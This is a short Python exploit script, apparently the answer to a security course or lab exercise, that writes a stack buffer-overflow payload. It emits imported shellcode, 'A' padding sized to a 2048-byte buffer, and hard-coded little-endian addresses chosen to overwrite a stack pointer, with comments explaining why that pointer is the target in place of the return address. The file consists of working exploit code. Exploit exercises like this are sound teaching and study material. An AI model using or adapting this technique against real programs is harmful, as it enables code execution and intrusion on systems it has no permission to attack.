#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode + ((2048-54)*b'A') +(0x7ffffff6d520).to_bytes(8,"little") + (0x7ffffff6d4e8).to_bytes(8,"little"))

#sys.stdout.buffer.write(shellcode + ((0x810-54+8)*b'A')+(0x7ffffff6d520).to_bytes(8,"little"))
# buf(2048) --> a(8) --> p(8) --> return addr but this return addr is not something we can overwrite
# instead we can write to p, which is a pointer at the bottom of the stack
# we are trying to put the return addr into p bc cannot overwrite it like before
# lea starts at 0x810 (this is where the buffer starts)